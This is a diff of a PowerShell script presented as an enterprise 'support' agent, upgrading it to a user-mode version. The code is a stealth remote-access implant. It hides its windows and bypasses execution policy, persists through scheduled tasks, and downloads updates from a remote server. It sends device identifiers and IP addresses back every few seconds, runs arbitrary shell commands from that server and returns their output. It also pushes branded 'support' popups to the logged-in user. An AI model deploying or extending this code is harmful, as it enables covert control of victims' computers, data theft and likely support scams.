@@ -1,21 +1,19 @@
 param(
-    $ServerUrl = "https://unified-manager.vercel.app"
+    [string]$ServerUrl = "https://unified-manager-q8xuknqq-wiandu-randts-projects.vercel.app",
+    [switch]$Install
 )
 
-# Unified Enterprise Agent (UEA)
-# Version: 1.6.1
-# Description: Professional stealth endpoint agent with premium Support GUI.
+# Version: 1.6.5
+# Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 1. ENVIRONMENT SANITATION
-# Force TLS 1.2 using safe string-based assignment
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12"
 $ProgressPreference = 'SilentlyContinue'
 $ErrorActionPreference = "Stop"
-$InstallDir = "$env:ProgramData\UnifiedAgent"
+$InstallDir = "$env:LOCALAPPDATA\UnifiedAgent"
 $LogFile = "$InstallDir\agent.log"
 $ScriptPath = "$InstallDir\unified-agent.ps1"
 $ConfigPath = "$InstallDir\config.json"
-# Official Equinox branding
 $SupportLogo = "Equinox-Logo-Transparent.png"
 
 function Log-Message {
@@ -30,7 +28,7 @@ function Log-Message {
     }
 }
 
-# 2. GHOST KILLER
+# 2. GHOST KILLER (User-Mode)
 try {
     Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | ForEach-Object { 
         Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue 
@@ -39,81 +37,59 @@ try {
 
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
-    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-    if (-not $IsAdmin) { 
-        Log-Message "Installation skipped: Not running as Administrator."
-        return 
-    }
     try {
-        Log-Message "Initiating System-Level Master Reset..."
-        # 1. Stop and Clean Persistence Tasks
-        Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
-        Unregister-ScheduledTask -TaskName "UEA_Persistence" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-        Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-
-        # 2. Aggressive Process Nuke to release file locks
-        try {
-            $AllPs = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID }
-            foreach ($P in $AllPs) { Stop-Process -Id $P.ProcessId -Force -ErrorAction SilentlyContinue }
-            Start-Sleep -Seconds 1
-        } catch {}
-
-        # 3. Atomic File Deployment
+        Log-Message "Initiating User-Level Persistent Install v1.6.5..."
+        $TaskName = "UEA_Support_Persistence"
+        Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
+        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+        
         if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
         
-        Log-Message "Deploying v1.5.7 core binary..."
+        Log-Message "Deploying binary..."
         $SourceFile = if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) { $PSCommandPath } else { "$InstallDir\temp_agent.ps1" }
         
         if ($SourceFile -match "temp_agent.ps1") {
             (New-Object System.Net.WebClient).DownloadFile("$ServerUrl/api/agent/update", "$SourceFile")
         }
 
-        # Try to move file into place (Atomic overwrite)
-        for ($i=0; $i -lt 5; $i++) {
-            try {
-                Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
-                break
-            } catch {
-                Start-Sleep -Seconds 1
-                Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
-            }
-        }
-
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.9" }
+        Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
+        
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.5" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
         $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
         $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii
 
-        # 4. Re-Register and Start Persistence (Omni-Persistence)
         $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
-        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
         
-        try {
-            $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger $Trigger1 -Principal $Principal -Settings $Settings -Force | Out-Null
-        } catch {
-            Log-Message "SYSTEM registration failed, falling back to CurrentUser..."
-            Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger $Trigger1 -Settings $Settings -Force | Out-Null
-        }
+        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
-        Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
-        Log-Message "Stealth v1.6.1 Active."
+        Start-ScheduledTask -TaskName $TaskName | Out-Null
+        Log-Message "User-Mode v1.6.5 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
-            Write-Host "Equinox Stealth Architecture v1.6.1 Deployed. Background process starting..."
             exit
         }
     } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
 }
 
-# 4. INITIALIZATION
+# 4. MAIN LOOP
 try {
-    $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
-    $SerialNumber = try { (Get-CimInstance Win32_Bios).SerialNumber } catch { "Unknown" }
+    if ($Install) {
+        Install-StealthAgent
+    }
+
+    # Stable ID detection (Registry is faster and more reliable than CIM if CIM hangs)
+    $AgentId = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { 
+        try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { "$($env:COMPUTERNAME)" }
+    }
+    $SerialNumber = try { (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -ErrorAction Stop).SystemSerialNumber } catch { "Unknown" }
     
-    $TaskStatus = try { Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction Stop } catch { $null }
+    $TaskName = "UEA_Support_Persistence"
+    $TaskStatus = try { Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch { $null }
+    
     if (($PSCommandPath -ne $ScriptPath) -or ($null -eq $TaskStatus)) {
         Install-StealthAgent
     }
@@ -123,23 +99,22 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.6.1 Started. ID: $AgentId"
-    # 5. HEARTBEAT LOOP
+    Log-Message "Agent v1.6.5 Started. ID: $AgentId"
     while ($true) {
         try {
-            $OS = try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Windows Endpoint" }
-            $PubIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip } catch { "ISP Restricted" }
-            $LocIp = try { (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPv4Address -notlike "169.254*" } | Select-Object -First 1).IPv4Address } catch { "Unknown" }
+            $OSInfo = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop).ProductName } catch { "Windows Endpoint" }
+            $PubIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip } catch { "Unknown" }
+            # FORCE IPv4 ONLY
+            $LocIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress } catch { "Unknown" }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.6.1"; status = "online"
-                deviceName = $env:COMPUTERNAME; os = $OS; publicIp = $PubIp; localIp = $LocIp; isp = "Managed"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.6.5"; status = "online"
+                deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $PubIp; localIp = $LocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
             $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"
 
-            # Upgrade Hook
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.1")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.5")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -148,7 +123,6 @@ try {
                 exit
             }
 
-            # Command Processor
             foreach ($cmd in $Response.commands) {
                 try {
                     $Result = ""
@@ -211,14 +185,17 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`
                         if ($ActiveUser) {
                             $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
                             "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
-                            $TaskName = "UEA_Support_$(Get-Random)"
+                            $SupportTaskName = "UEA_Support_Msg_$(Get-Random)"
                             $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
-                            $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
-                            Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Force | Out-Null
-                            Start-ScheduledTask -TaskName $TaskName | Out-Null
+                            try {
+                                $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
+                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action -Principal $Principal | Out-Null
+                            } catch {
+                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action | Out-Null
+                            }
+                            Start-ScheduledTask -TaskName $SupportTaskName | Out-Null
                             Start-Sleep -Seconds 5
-                            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
-                            $Result = "Support GUI delivered."
+                            Unregister-ScheduledTask -TaskName $SupportTaskName -Confirm:$false | Out-Null
                         }
                     } elseif ($cmd.type -eq "shell") {
                         $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
@@ -227,9 +204,9 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`
                         $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
                         Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body ($ResultPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                     }
-                } catch { Log-Message "Cmd Fail: $($_.Exception.Message)" }
+                } catch { Log-Message "Cmd Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
             }
-        } catch {}
+        } catch { Log-Message "Loop Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
         Start-Sleep -Seconds 3
     }
-} catch { Log-Message "Fatal: $($_.Exception.Message)" }
+} catch { Log-Message "Fatal at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
